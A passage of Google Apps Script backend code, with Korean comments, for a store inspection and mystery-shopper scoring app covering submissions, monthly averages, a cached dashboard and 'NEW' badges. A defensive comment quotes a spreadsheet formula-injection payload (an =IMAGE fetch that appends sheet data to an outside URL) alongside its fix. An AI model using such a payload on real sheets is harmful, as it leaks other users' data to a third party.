  const photoMap = savePhotos(p, ctx); // {문항no: [{url, id}]}
  // v3.7 절대 감점제 스키마: 대분류 점수 대신 감점 3층 + 중대 차감 기록
  // 맨 뒤 '계정' 칸은 누가 제출했는지 남기기 위한 것 — p.inspector는 자유 입력이라 검증할 방법이 없다
  const sum = sheet(ss, 'QSC_회차', ['제출시각', '점검일자', '방문시간', '매장명', '점검자', 'QSC점수', '등급',
    '일반감점', '★차감', '★★차감', '중대차감합계', '응답수', '사진수', '계정']);
  const r = p.result || {};
  let photoN = 0;
  p.items.forEach(function (it) { photoN += (photoMap[it.no] || []).length; });
  sum.appendRow(safeRow([p.submittedAt, p.date, p.time || '', p.store, p.inspector,
    r.qsc == null ? '' : round1(r.qsc), r.grade || '',
    r.genDeduct || 0, (r.s2 && r.s2.deduct) || 0, (r.s1 && r.s1.deduct) || 0, r.criticalDeduct || 0,
    p.items.filter(function (it) { return it.value !== null; }).length, photoN,
    ctx ? ctx.id : '']));

  const det = sheet(ss, 'QSC_상세', ['점검일자', '방문시간', '매장명', '코드', '문항번호', '구분', '문항', '등급구분', '개선필요건수', '상태', '감점', '비고', '사진']);
  const rows = p.items
    .filter(function (it) { return it.value !== null; })
    .map(function (it) {
      const sev = it.severity === 'S1' ? '★★' : it.severity === 'S2' ? '★' : '';
      return safeRow([p.date, p.time || '', p.store, it.code || '', it.no, it.group || '', it.text, sev,
        String(it.value), it.rating || '', it.deduct == null ? '' : -it.deduct,
        it.memo || '', (photoMap[it.no] || []).map(function (x) { return x.url; }).join('\n')]);
    });
  appendRows(det, rows);

  // 매장별 NA 프리셋 갱신 — 다음 회차에 앱이 자동 제안 (config.get으로 내려감)
  try {
    const naSheet = sheet(ss, 'NA프리셋', ['매장명', 'NA문항', '갱신일']);
    /* ★it.no는 클라이언트가 정하는 값이다★ — 종전에는 그것을 그대로 join해 만든 문자열을
       safe() 없이 setValues로 넣었다(이미 한 번 제출된 매장은 found>0 경로를 탄다).
       그래서 items:[{no:'=IMAGE("https://…"&JOIN(",",QSC_상세!L2:L200))', value:'NA'}] 한 건이면
       QSC 응답 파일에 자동 페치 수식이 심어지고, 그 셀 값은 naPresets()로 읽혀 config.get
       응답에 실려 전 사용자에게 되돌아간다. 방어를 둘 겹친다: ①문항번호는 정수만 통과시키고
       ②그렇게 만든 문자열도 safe()를 거친다. */
    const naNos = p.items.filter(function (it) {
      return it.value === 'NA' && typeof it.no === 'number' && isFinite(it.no) && it.no === Math.floor(it.no);
    }).map(function (it) { return it.no; }).join(',');
    const vals = naSheet.getDataRange().getValues();
    let found = -1;
    for (let i = 1; i < vals.length; i++) {
      if (normStore(vals[i][0]) === normStore(p.store)) { found = i + 1; break; }
    }
    if (found > 0) naSheet.getRange(found, 2, 1, 2).setValues([safeRow([naNos, p.date])]);
    else naSheet.appendRow(safeRow([p.store, naNos, p.date]));
  } catch (err) { /* 프리셋 실패는 저장에 영향 없음 */ }

  // ②③ 연동 기록 — 실패해도 원본 저장은 유지하고 결과만 알림
  const extra = { dashboard: null, storeFile: null };
  if (DASHBOARD_ID) {
    if (DASHBOARD_WRITE) {
      try {
        extra.dashboard = p.result.final == null ? { ok: false, error: '점수 없음' }
          : writeDashboard(p.store, p.date, p.result.final / 100, 0);
      } catch (err) { extra.dashboard = { ok: false, error: opErr('통합시트 기록', err) }; }
    } else {
      extra.dashboard = { ok: true, skipped: true, note: '통합시트 점수는 직접 입력' };
    }
    if (STORE_FILE_WRITE) {
      try { extra.storeFile = writeStoreQsc(p, photoMap); }
      catch (err) { extra.storeFile = { ok: false, error: opErr('매장 파일 기록', err) }; }
    } else {
      extra.storeFile = { ok: true, skipped: true, note: '매장 파일 기록 꺼짐 (시험 운영)' };
    }
  }
  dropDashCache(p.date);
  dropStoreCache(p.store, yymm(p.date));   // 방금 쓴 매장·달의 조회 캐시도 함께 비운다
  const out = { ok: true, saved: rows.length, photos: photoN, dashboard: extra.dashboard, storeFile: extra.storeFile };
  if (photoMap.__skipped) {
    out.photosSkipped = photoMap.__skipped;
    /* 조용히 사라지면 아무도 모른다 — 담당자가 볼 수 있는 곳에 남긴다 */
    auditLog(ctx || anonCtx(), 'qsc.submit', p.store, '경고', 'PHOTO_SKIPPED',
      '용량·형식이 맞지 않아 저장하지 않은 사진 ' + photoMap.__skipped + '장');
  }
  return out;
}

function saveShopper(ss, p, ctx, isSurvey) {
  // 익명 경로는 입력경로를 서버가 강제한다. 클라이언트가 보낸 p.source는 읽지 않는다.
  const route = isSurvey ? '고객 직접' : '관리자 입력';
  const sh = sheet(ss, '쇼퍼_응답', ['제출시각', '방문날짜', '방문시간', '매장명', '응대직원설명', '주문내역', '작성자연령대성별', '입력경로', '점수', '응답수']
    .concat(p.answers.map(function (a) { return 'Q' + a.no; })));
  const row = [p.submittedAt, p.date, p.time || '', p.store, p.staff, p.order, p.demographic,
    route, p.result.score == null ? '' : round1(p.result.score), p.result.answered]
    .concat(p.answers.map(function (a) { return a.answer || ''; }));
  /* ★영수증 열은 2026-08-20에 없앴다 — 그런데 이미 만들어진 시트에는 그 열이 남아 있다★
     sheet()는 시트가 없을 때만 머리글을 쓰므로, 옛 시트는 11번째 칸이 '영수증'인 채로 그대로다.
     보정 없이 짧아진 행을 붙이면 Q1의 답이 그 칸으로 들어가 ★그 뒤가 통째로 한 칸씩 밀린다★.
     그래서 머리글을 보고 그 자리에 빈칸을 하나 끼운다. 열을 아주 없애려면 편집기에서
     dropReceiptColumn() 을 한 번 돌린다 — 돌리지 않아도 기록은 어긋나지 않는다. */
  try {
    const head = sh.getRange(1, 1, 1, Math.max(1, sh.getLastColumn())).getValues()[0].map(String);
    const at = head.indexOf('영수증');
    if (at >= 0) row.splice(at, 0, '');
  } catch (e) { /* 머리글을 못 읽으면 보정 없이 그대로 붙인다 */ }
  sh.appendRow(safeRow(row));

  // 문항별 이유·비고 — 작성된 것만 1행씩 (추적용, 특히 '아니오'의 근거)
  const memoRows = p.answers.filter(function (a) { return a.memo; }).map(function (a) {
    return safeRow([p.submittedAt, p.date, p.time || '', p.store, route,
      a.no, a.text, a.answer || '', a.memo]);
  });
  if (memoRows.length) {
    const ms = sheet(ss, '쇼퍼_비고', ['제출시각', '방문날짜', '방문시간', '매장명', '입력경로', '문항번호', '문항', '응답', '비고']);
    appendRows(ms, memoRows);
  }

  /* ★제출이 들어올 때마다 그 달 평균을 다시 계산해 덮어쓴다★ (2026-08-20 사용자 제안)

     종전에는 익명 설문이 여기서 곧장 끝났다 — 매장 파일·통합시트를 아예 부르지 않았다.
     그래서 순서에 따라 이런 일이 생겼다:
         5일  본사 제출        → 그때까지의 평균이 숫자로 박힌다
         20일 고객 3건 들어옴  → 아무 일도 일어나지 않는다 (영영 점수에 안 들어간다)
     고객 응답도 CS에 똑같이 반영하기로 한 이상 이 구멍을 그대로 둘 수 없다.
     ★그 달 마지막 제출이 항상 옳은 값을 남기게 한다★ — 덮어쓰기라 몇 번 돌아도 결과가 같다.

     ⚠이 줄 때문에 ★익명 경로가 매장 파일 한 칸(CS 점수)을 쓰게 된다★.
       쓰는 값은 사용자가 보낸 숫자가 아니라 시트에서 다시 계산한 평균이고,
       스위치(STORE_FILE_WRITE·DASHBOARD_WRITE)가 꺼져 있으면 애초에 쓰지 않는다.
       그래도 넓어지는 것은 사실이므로, 제출 코드가 생기기 전까지는 그 점을 알고 있어야 한다. */

  // 통합시트 CS 칸 + 매장 파일 CS점수: 같은 달 쇼퍼가 여러 명이면 "해당 월 평균"으로 기록
  const extra = { dashboard: null, storeFile: null };
  if (DASHBOARD_ID && p.result.score != null) {
    const avg = shopperMonthAvg(sh, p.store, p.date, ss.getSpreadsheetTimeZone());
    /* dashboard와 storeFile의 catch를 분리한다 — 합쳐 두면 매장 파일 실패가
       성공한 dashboard 결과를 오류로 덮어써 원인을 잘못 보게 된다. */
    try {
      extra.dashboard = DASHBOARD_WRITE
        ? writeDashboard(p.store, p.date, avg / 100, 2)
        : { ok: true, skipped: true, note: '통합시트 CS 점수는 직접 입력', monthAvg: round1(avg) };
    } catch (err) { extra.dashboard = { ok: false, error: opErr('통합시트 기록', err) }; }
    try {
      extra.storeFile = STORE_FILE_WRITE
        ? writeStoreShopper(p.store, p.date, avg / 100)
        : { ok: true, skipped: true, note: '매장 파일 기록 꺼짐 (시험 운영)' };
    } catch (err) { extra.storeFile = { ok: false, error: opErr('매장 파일 기록', err) }; }
  }
  dropDashCache(p.date);
  dropStoreCache(p.store, yymm(p.date));   // 방금 쓴 매장·달의 조회 캐시도 함께 비운다
  /* ★익명 제출에는 결과를 돌려주지 않는다★ — 쓰기는 하되 무엇이 쓰였는지는 알려 주지 않는다.
     extra 안에는 그 매장의 이번 달 CS 평균(monthAvg)과 시트 기록 상태가 들어 있다.
     고객 화면은 그 값을 쓰지 않지만(감사 인사만 띄운다), 응답 본문에 실리면
     설문을 한 건 넣는 것만으로 그 매장 점수를 읽어 갈 수 있다. */
  return isSurvey ? { ok: true } : { ok: true, dashboard: extra.dashboard, storeFile: extra.storeFile };
}

/* ★tz는 반드시 '스프레드시트' 타임존이다 (§9-4)★
   종전에는 d.getFullYear()/getMonth()를 썼는데, 그것은 스프레드시트가 아니라 ★앱스 스크립트
   프로젝트★ 타임존으로 해석된다. 둘이 다르면(backend/에 appsscript.json이 없어 프로젝트
   타임존이 무엇인지 코드로는 확인되지 않는다) 방문날짜 2026-10-01이 9월로 읽혀
   ①10월 1일 쇼퍼 제출이 9월 평균에 섞이고 ②10월 평균에서는 빠진다.
   그 평균은 writeStoreShopper·통합시트로 흘러가고 ★10월부터 CS는 종합점수의 30%★다.
   예외가 나지 않고 숫자만 조금 달라지는, 가장 잡기 어려운 종류의 틀림이었다.
   ymOfCell() 하나로 통일한다 — status.month가 이미 쓰고 있는 그 함수다. */
function shopperMonthAvg(sh, store, dateStr, tz) {
  const ym = dateStr.slice(0, 7); // 'YYYY-MM'
  /* ★끝에서부터 읽는다★ — 이 시트는 익명 고객 설문이 함께 쌓이는 공개 시트라
     getDataRange()면 제출 1건마다 수천 행을 읽게 된다 (submittedStores와 같은 이유). */
  const last = sh.getLastRow();
  if (last < 2) return 0;
  const n = Math.min(3000, last - 1);
  const rng = grid(sh, last - n + 1, 1, n, 9);
  const vals = rng ? rng.getValues() : [];
  const scores = [];
  const key = normStore(store);
  /* ★본사가 채운 것과 고객이 낸 것을 구별하지 않는다★ (2026-08-20 사용자 결정)
     담당자가 직접 체크하는 경우도 미스터리쇼퍼와 같은 일이다 — 손님으로 가서 보고 적는 것이다.
     그래서 두 경로가 CS 점수에 똑같이 들어간다. 시트의 '입력경로' 칸은 ★기록용으로만★ 남는다.

     ⚠종전에는 '관리자 입력'만 셌다. 이유는 survey.html을 누구나 열 수 있다는 것이었다 —
       아무나 특정 매장 이름으로 설문을 여러 건 넣어 그 달 CS를 끌어내리거나(또는 올리거나) 할 수 있다.
       CS는 10월부터 종합점수의 30%다. ★그 방어는 제출 코드(매장 1곳 = 코드 1개 = 월 1회)가 맡는다★ —
       설계는 `_보관/설계/쇼퍼_제출코드_설계.md`에 있고 아직 만들지 않았다.
       그때까지는 담당자가 `쇼퍼_응답` 시트를 보고 이상한 건을 지우거나 고친다(그 편집이 곧 반영된다). */
  for (let i = 0; i < vals.length; i++) {
    const dYm = ymOfCell(vals[i][1], tz);
    // 열 순서: 0 제출시각 · 1 방문날짜 · 2 방문시간 · 3 매장명 … 7 입력경로 · 8 점수
    if (normStore(vals[i][3]) === key && dYm === ym && typeof vals[i][8] === 'number') {
      scores.push(vals[i][8]);
    }
  }
  if (!scores.length) return 0;
  return scores.reduce(function (a, b) { return a + b; }, 0) / scores.length;
}

/* ---------- ② 통합시트 [데이터] ---------- */

// offset: 0 = 위생(QSC) 점수 열, 2 = CS(쇼퍼) 점수 열. 등급·종합 열은 시트 수식이라 건드리지 않는다.
// ※DASHBOARD_WRITE가 영구 false라 지금은 호출되지 않는다. 권한이 생기는 날을 위해 남겨 둔다.
function writeDashboard(store, dateStr, frac, offset) {
  const sh = SpreadsheetApp.openById(DASHBOARD_ID).getSheetByName(DASHBOARD_SHEET);
  const month = parseInt(dateStr.slice(5, 7), 10);
  const col = MONTH_COL[month] + offset;
  const last = sh.getLastRow();
  const rng = grid(sh, 6, STORE_NAME_COL, last - 5, 1); // D6부터 매장명
  const names = rng ? rng.getValues() : [];
  const key = normStore(store);
  for (let i = 0; i < names.length; i++) {
    if (normStore(names[i][0]) === key) {
      const row = 6 + i;
      sh.getRange(row, col).setValue(frac);
      return { ok: true, cell: sh.getRange(row, col).getA1Notation() };
    }
  }
  return { ok: false, error: '통합시트에 매장 행 없음: ' + store };
}

/* ---------- 대시보드 조회 (명세 §10) ---------- */

/* 점수·등급·순위의 정본은 통합시트 [데이터] 1회 읽기다. 앱이 계산할 것이 하나도 없고,
   10월 산식 개편에 대해 앱 코드 변경이 0줄이다(산식이 시트 수식에 있다).
   26개 파일 순회는 채택 불가 — 6분 제한이 아니라 일일 실행시간 90분이 진짜 벽이다. */
function fnDashboard(ctx, payload, target) {
  const key = periodKey(payload && payload.period);
  if (!key) return err('BAD_REQUEST', '기간이 올바르지 않습니다.');
  const raw = dashRaw(key);
  if (!raw) return err('SERVER_ERROR', '전체 대시보드를 불러오지 못했습니다.');

  /* 캐시에는 투영 전 원본을 담고, 투영은 응답 직전에 한다. 역할별로 캐시 키를 나누지 않는다 —
     키 설계 실수 하나가 곧 타 매장 유출이다. mine은 오직 ctx.stores로 판정한다. */
  const mineList = target || [];
  const rows = [];
  for (let i = 0; i < raw.rows.length; i++) {
    const src = raw.rows[i];
    src.mine = mineList.indexOf(src.store) >= 0;
    const o = {};
    for (let k = 0; k < DASH_PUBLIC.length; k++) {
      const f = DASH_PUBLIC[k];
      if (Object.prototype.hasOwnProperty.call(src, f)) o[f] = src[f];
    }
    rows.push(o);
  }
  return {
    ok: true,
    period: raw.period,
    periods: dashPeriods(),
    weights: raw.weights,
    cols: raw.cols,
    stats: raw.stats,
    rows: rows,
    updatedAt: raw.updatedAt,
    cacheAge: Math.max(0, Math.round((Date.now() - raw.builtAt) / 1000))
  };
}

/* 'YYYY-MM' 또는 'YYYY'. 분기는 지원하지 않는다 — 분기 평균 2열의 열 번호가 실측되지 않았고,
   추측한 열은 조용히 틀린 숫자를 보여준다. */
function periodKey(v) {
  const s = String(v == null ? '' : v).trim();
  if (!s) return curYm();
  if (/^\d{4}-\d{2}$/.test(s)) {
    const m = Number(s.slice(5, 7));
    return (m >= 1 && m <= 12) ? s : '';
  }
  if (/^\d{4}$/.test(s)) return s;
  return '';
}
function curYm() {
  const tz = ssTz();
  return Utilities.formatDate(new Date(), tz, 'yyyy-MM');
}

/* 전체 대시보드 원본 생성 — 300초 캐시 + 락 후 재확인(double-check).
   아침에 26명이 동시 접속하면 1명만 통합시트를 읽고 25명은 히트한다.
   동시 실행 한도 30이 실질 병목이라 이 락이 없으면 아침마다 실패 응답이 섞인다. */
function dashRaw(key) {
  const ck = 'dash:v' + epoch() + ':' + key;
  const cache = CacheService.getScriptCache();
  let hit = cache.get(ck);
  if (hit) { try { return JSON.parse(hit); } catch (e) { } }
  const lock = LockService.getScriptLock();
  let got = false;
  try { got = lock.tryLock(15000); } catch (e) { got = false; }
  try {
    if (got) {
      hit = cache.get(ck);   // 락을 잡는 동안 남이 만들어 뒀을 수 있다
      if (hit) { try { return JSON.parse(hit); } catch (e) { } }
    }
    const built = buildDash(key);
    const packed = JSON.stringify(built);
    if (packed.length <= 90000) cache.put(ck, packed, 300);
    else Logger.log('dash 캐시 건너뜀 (' + packed.length + 'B)');
    return built;
  } finally {
    if (got) { try { lock.releaseLock(); } catch (e) { } }
  }
}

function dropDashCache(dateStr) {
  try {
    const ym = String(dateStr || '').slice(0, 7);
    const keys = ['dashraw:v' + epoch(), 'cfg:v' + epoch() + ':stores'];
    if (/^\d{4}-\d{2}$/.test(ym)) {
      keys.push('dash:v' + epoch() + ':' + ym);
      keys.push('dash:v' + epoch() + ':' + ym.slice(0, 4));
    }
    CacheService.getScriptCache().removeAll(keys);
  } catch (e) { }
}

function buildDash(key) {
  const isYear = /^\d{4}$/.test(key);
  const src = readDashboardRows();
  const tz = ssTz();
  const cur = readPeriodCols(key);
  const prevKey = isYear ? '' : prevMonthKey(key);
  /* 통합시트 [데이터]는 한 해의 12개월이 가로로 놓인 표다. 전월이 작년이면 이 시트에 없다. */
  const prevCols = (prevKey && prevKey.slice(0, 4) === key.slice(0, 4)) ? readPeriodCols(prevKey) : null;

  const rows = [];
  for (let i = 0; i < src.length; i++) {
    const v = src[i].v;
    const row = {
      store: src[i].store, region: src[i].region, category: src[i].category,
      qsc: null, qscGrade: null, cs: null, csGrade: null,
      improve: null, total: null, grade: null, status: 'none',
      rank: null, mine: false, prev: null, delta: null
    };
    fillPeriod(row, v, cur, key, isYear);
    if (prevCols) {
      const p = { total: null, status: 'none' };
      fillPeriod(p, v, prevCols, prevKey, false);
      if (p.status === 'done') row._prevTotal = p.total;
    }
    rows.push(row);
  }

  /* rank — 정렬 순서를 정하는 내부 값이다. ★화면에 등수로 찍지 않는다★(2026-08-16 지시 §1:
     줄세우기로 읽히면 안 된다). dashboard-app.js가 점수 순 정렬에만 쓰고 열로는 그리지 않으므로
     서버는 계속 담아 보낸다. 미점검 매장은 rank:null 로 맨 아래 — 0점으로 정렬에 섞으면
     점검을 안 했을 뿐인데 점수가 바닥인 것처럼 보인다. */
  const scored = rows.filter(function (r) { return r.status === 'done' && typeof r.total === 'number'; });
  scored.sort(function (a, b) { return b.total - a.total; });
  for (let i = 0; i < scored.length; i++) scored[i].rank = i + 1;

  // 전월 순위 (delta 표시용)
  if (prevCols) {
    const pv = rows.filter(function (r) { return typeof r._prevTotal === 'number'; });
    pv.sort(function (a, b) { return b._prevTotal - a._prevTotal; });
    for (let i = 0; i < pv.length; i++) pv[i]._prevRank = i + 1;
  }
  const sameFormula = prevCols && (formulaOf(key) === formulaOf(prevKey));
  for (let i = 0; i < rows.length; i++) {
    const r = rows[i];
    if (typeof r._prevTotal === 'number') {
      r.prev = { total: r._prevTotal, rank: r._prevRank || null };
      /* ★산식 경계를 넘는 비교는 delta:null★ — 이중 감점이 사라져 10월 종합점수가 구조적으로
         오르므로, 그대로 두면 전 매장이 "실적 개선"으로 보여 신뢰를 잃는다. */
      if (sameFormula && typeof r.total === 'number') r.delta = round1(r.total - r._prevTotal);
    }
    delete r._prevTotal;
    delete r._prevRank;
  }
  const unscored = rows.filter(function (r) { return r.rank === null; });
  const ordered = scored.concat(unscored);

  const totals = scored.map(function (r) { return r.total; });
  const stats = {
    n: rows.length,
    scored: scored.length,
    avgTotal: totals.length ? round1(totals.reduce(function (a, b) { return a + b; }, 0) / totals.length) : null,
    top: totals.length ? totals[0] : null,
    bottom: totals.length ? totals[totals.length - 1] : null
  };

  const f = formulaOf(key);
  return {
    period: {
      key: key, type: isYear ? 'year' : 'month',
      label: isYear ? (key + '년 연간') : (key.slice(0, 4) + '년 ' + Number(key.slice(5, 7)) + '월'),
      formula: f
    },
    /* 가중치는 서버가 정하고 화면은 표시만 한다. legacy는 =AVERAGE(위생,CS)-개선건수 였으므로 5:5. */
    weights: (f === 'v2') ? { qsc: 0.6, shopper: 0.3, improve: 0.1 } : { qsc: 0.5, shopper: 0.5, improve: 0 },
    cols: {
      /* ★라벨은 formulaOf가 아니라 fillPeriod의 improveIsRate와 같은 조건으로 정해야 한다★
         연간(CU열)은 처음부터 개선율인데 formulaOf('2026')는 'legacy'를 돌려주므로,
         종전에는 연간을 열어도 '개선요청(건)'이라 적힌 칸에 94.1(퍼센트)이 찍혔다. */
      improve: (isYear || key >= '2026-10') ? '개선율(%)' : '개선요청(건)',
      hasHygieneCs: !isYear   // 연간 구역에는 97·98·99 3열밖에 없어 위생·CS 열이 존재하지 않는다
    },
    stats: stats,
    rows: ordered,
    updatedAt: Utilities.formatDate(new Date(), tz, "yyyy-MM-dd'T'HH:mm:ssXXX"),
    builtAt: Date.now()
  };
}

function formulaOf(key) { return key >= '2026-10' ? 'v2' : 'legacy'; }

/* 기간별 열 번호. 월은 MONTH_COL 블록(오프셋 +0 위생 +1 등급 +2 CS +3 등급 +4 개선 +5 종합 +6 등급),
   연간은 YEAR_COL. 열 번호는 1-base이므로 배열 인덱스는 -1 한다. */
function readPeriodCols(key) {
  if (/^\d{4}$/.test(key)) {
    return { year: true, total: YEAR_COL.score, grade: YEAR_COL.grade, improve: YEAR_COL.improve };
  }
  const m = Number(key.slice(5, 7));
  const base = MONTH_COL[m];
  if (!base) return null;
  return {
    year: false, qsc: base, qscGrade: base + 1, cs: base + 2, csGrade: base + 3,
    improve: base + 4, total: base + 5, grade: base + 6
  };
}

/* 오프셋별 타입 테이블을 지킨다:
     점수 열 = 숫자(fraction) → ×100 · 등급 열 = 문자열(★×100 하지 말 것★)

   개선(+4)열이 가장 헷갈린다. 화면에는 '5%'로 보이지만 셀이 담고 있는 값은 0.05다
   (백분율 서식은 보여주는 방식일 뿐 값을 바꾸지 않는다. getValues()는 0.05를 준다).
   그런데 이 칸의 뜻은 백분율이 아니라 **개선요청 건수 5건**이다. 즉 건수 = 값 × 100이다.
   ★종전에는 셀에 정수 5가 들어 있다고 보고 값을 그대로 내려보냈다★ — 그래서 대시보드
     개선요청 열이 26개 매장 전부 0.0으로 찍혔다(0.05를 소수점 1자리로 반올림한 결과다).

   2026-10부터는 같은 칸의 뜻이 '개선율'로 바뀐다(종합 = QSC 60 + 쇼퍼 30 + 개선현황 10).
   그때는 값이 진짜 비율이므로 ×100이 곧 퍼센트다. 연간(CU열)도 처음부터 개선율이다.
   결국 세 경우 모두 ×100이지만 **단위가 다르다** — 건수냐 퍼센트냐. 라벨을 그에 맞춘다. */
function fillPeriod(row, v, cols, key, isYear) {
  if (!cols) return;
  const improveIsRate = isYear || (key >= '2026-10');
  const rawImprove = v[cols.improve - 1];
  if (cols.year) {
    const t = v[cols.total - 1];
    row.total = pct(t);
    row.grade = str(v[cols.grade - 1]);
    row.improve = improveIsRate ? pct(rawImprove) : cnt(rawImprove);
    /* 연간: 97이 숫자가 아니거나, 97===0이고 개선율도 비었으면 미점검 */
    row.status = (typeof t !== 'number' || (t === 0 && row.improve === null)) ? 'none' : 'done';
    if (row.status === 'none') { row.total = null; row.grade = null; row.improve = null; }
    return;
  }
  const q = v[cols.qsc - 1];
  const c = v[cols.cs - 1];
  const t = v[cols.total - 1];
  row.qsc = pct(q);
  row.qscGrade = str(v[cols.qscGrade - 1]);
  row.cs = pct(c);
  row.csGrade = str(v[cols.csGrade - 1]);
  row.improve = improveIsRate ? pct(rawImprove) : cnt(rawImprove);
  row.total = pct(t);
  row.grade = str(v[cols.grade - 1]);
  /* status: 0을 미점검으로 잡아야 한다. typeof!=='number'는 빈 셀과 '#DIV/0!'는 잡지만 0은 못 잡는다.
     종합 열이 =IFERROR(…,0)이면 그 매장이 점수 순 정렬의 맨 아래에 섞여 들어간다. */
  const hasQ = (typeof q === 'number');
  const hasC = (typeof c === 'number');
  if (!hasQ && !hasC) row.status = 'none';
  else if (typeof t !== 'number') row.status = 'none';
  else row.status = 'done';
  /* 미점검이면 숫자를 아예 내리지 않는다. 0을 내려보내면 화면이 그것을 점수로 그리고
     그 매장은 26위가 된다 — 설계가 피하려던 "우리가 꼴찌" 신호가 정확히 발생한다. */
  if (row.status === 'none') {
    row.qsc = null; row.qscGrade = null; row.cs = null; row.csGrade = null;
    row.improve = null; row.total = null; row.grade = null;
  }
}

function pct(v) { return (typeof v === 'number') ? round1(v * 100) : null; }
/* 개선요청 '건수'. 셀은 5건을 0.05로 담고 백분율 서식으로 5%처럼 보여 준다 —
   값을 그대로 쓰면 화면에 0.0이 찍힌다. 건수는 정수이므로 반올림해서 내려보낸다. */
function cnt(v) { return (typeof v === 'number') ? Math.round(v * 100) : null; }
function num(v) { return (typeof v === 'number') ? v : null; }
function str(v) {
  const s = String(v == null ? '' : v).trim();
  return s ? s : null;
}

function prevMonthKey(key) {
  let y = Number(key.slice(0, 4));
  let m = Number(key.slice(5, 7)) - 1;
  if (m < 1) { m = 12; y -= 1; }
  return y + '-' + pad2(m);
}

/* 기간 선택 목록 — 올해 1월부터 이번 달까지(내림차순) + 연간.
   명세 예시는 3개뿐이지만 그건 예시이고, 담당자는 지난달·지지난달을 실제로 본다.
   과거 연도는 통합시트가 해마다 다른 파일이므로 이 목록에 넣지 않는다. */
function dashPeriods() {
  const tz = ssTz();
  const y = Number(Utilities.formatDate(new Date(), tz, 'yyyy'));
  const m = Number(Utilities.formatDate(new Date(), tz, 'MM'));
  const out = [];
  for (let i = m; i >= 1; i--) out.push({ key: y + '-' + pad2(i), label: y + '년 ' + i + '월' });
  out.push({ key: String(y), label: y + '년 연간', warn: '산식 혼재 · 종합만 제공' });
  return out;
}

/* ---------- 매장현황 (명세 §11) ---------- */

function fnStoreGet(ctx, payload, target) {
  const store = target;
  if (!store) return err('BAD_REQUEST', '매장을 선택해 주세요.');
  const ym = String(payload && payload.ym ? payload.ym : '').trim() || curYymm();
  if (!validYm(ym)) return err('BAD_REQUEST', '월이 올바르지 않습니다.');

  const body = storeMonthBody(store, ym);
  if (!body.ok) return body;

  const out = JSON.parse(JSON.stringify(body));
  /* ★사람마다 달라지는 값은 캐시가 아니라 여기서 붙인다★
     readOnly는 권한이, isNew는 그 계정의 최근접속이 정한다. 캐시에 담으면 먼저 연 사람의
     권한·기준선이 다음 사람에게 그대로 간다. */
  out.readOnly = !(prop('STORE_IMPROVE_WRITE', 'false') === 'true' && can(ctx.role, 'store', '쓰기').allow);
  markNewItems(out.items, store, ym, seenBaseline(ctx.id));
  return out;
}

/* 매장 월 탭 스냅샷 — store.get과 notify.badge가 ★같은 캐시를 공유한다★.
   홈에서 배지를 받은 직후 매장현황으로 들어가는 것이 가장 흔한 동선이라, 키를 나누면
   같은 탭을 1분 안에 두 번 읽게 된다. 예외를 던지지 않고 err() 객체를 돌려준다 —
   배지는 한 매장이 실패해도 나머지를 세어야 한다. */
function storeMonthBody(store, ym) {
  const ck = 'store:v' + epoch() + ':' + store + ':' + ym;
  const cache = CacheService.getScriptCache();
  const hit = cache.get(ck);
  if (hit) { try { return JSON.parse(hit); } catch (e) { } }

  const id = storeFileId(store);
  if (!id) return err('NOT_FOUND', '매장 파일을 찾지 못했습니다. 담당자에게 문의해 주세요.');
  let ss;
  try { ss = SpreadsheetApp.openById(id); }
  catch (e) { return err('NOT_FOUND', '매장 파일을 열 수 없습니다. 담당자에게 문의해 주세요.'); }
  const sh = ss.getSheetByName(ym);
  if (!sh) {
    /* 탭이 아직 없는 것은 오류가 아니다(본사가 안 만들었을 뿐). 캐시하지 않는다 —
       만드는 즉시 보여야 하고, 이 경로는 이미 시트를 연 뒤라 캐시 이득도 없다.
       items를 빈 배열로 함께 내려 배지가 조건문 없이 셀 수 있게 한다. */
    return { ok: true, store: store, ym: ym, exists: false, items: [], months: monthTabs(ss),
      error: ym + ' 탭이 아직 만들어지지 않았습니다. 본사 담당자에게 문의해 주세요.' };
  }
  const body = readStoreTab(ss, sh, store, ym);
  const packed = JSON.stringify(body);
  /* CacheService.put()은 100KB를 넘으면 예외 없이 조용히 아무것도 저장하지 않는다.
     그러면 그 매장만 매 요청이 시트를 열어 응답이 3~5초로 늘어진다. */
  if (packed.length <= 90000) cache.put(ck, packed, 60);
  else Logger.log('store 캐시 건너뜀: ' + store + ' ' + ym + ' (' + packed.length + 'B)');
  return body;
}

/* ---------- 'NEW' 배분 ---------- */

/* 개선요청 표에는 '언제 등록됐는지'가 적히는 칸이 없다. 그래서 등록 시각은 응답 원본
   (QSC_회차 제출시각)에서 가져오고, 표의 어느 행이 어느 회차의 것인지는 ★행 순서★로 잇는다 —
   writeStoreQsc가 회차마다 표 맨 아래에 이어 붙이기만 하므로, 마지막 회차의 개선요청이
   표의 마지막 N행이다.

   ★셈이 조금이라도 맞지 않으면 NEW를 하나도 붙이지 않는다★. 경계가 한 칸만 밀려도
   엉뚱한 항목에 NEW가 붙는데, 그러면 매장이 그다음부터 배지를 믿지 않는다.
   배지는 '없어도 되는 편의'이고 '틀리면 해로운' 종류다. */
function markNewItems(items, store, ym, since) {
  if (!items || !items.length) return;
  for (let i = 0; i < items.length; i++) items[i].isNew = false;
  if (!since) return;                       // 기준선 없음 = 이 계정의 첫 방문

  const rounds = qscRounds(store, ym);      // 오래된 순
  if (!rounds.length) return;

  let after = 0;
  for (let r = 0; r < rounds.length; r++) if (rounds[r].at && rounds[r].at > since) after++;
  if (!after) return;                                   // 전부 기준선 앞 — 새 것이 없다
  if (after === rounds.length) {                        // 전부 기준선 뒤 — 표 전체가 새 것
    for (let i = 0; i < items.length; i++) items[i].isNew = true;
    return;
  }

  /* 여기부터가 '한 달에 두 번 점검한 매장' 경로다. 흔하지 않으므로 QSC_상세를 읽는 비용도
     이 분기에서만 문다 — 위 두 분기가 대부분의 요청을 회차 목록만으로 끝낸다. */
  const counts = roundTicketCounts(store, ym, rounds);
  if (!counts) return;
  let total = 0;
  for (let k = 0; k < counts.length; k++) total += counts[k];
  /* 본사가 표에 행을 손으로 넣었거나 지웠다는 뜻이다. 뒤에서부터 세는 전제가 깨졌으므로 멈춘다. */
  if (total !== items.length) return;

  let end = items.length;
  for (let k = rounds.length - 1; k >= 0; k--) {
    const start = end - counts[k];
    if (rounds[k].at && rounds[k].at > since) {
      for (let i = start; i < end; i++) items[i].isNew = true;
    }
    end = start;
  }
}

/* 이 매장·이 월의 회차 목록(오래된 순). QSC_회차 A 제출시각 · B 점검일자 · C 방문시간 · D 매장명.
   at은 ★인증 시트 타임존의 'yyyy-MM-dd HH:mm' 문자열★이다 — 기준선(계정 최근접속 칸)이
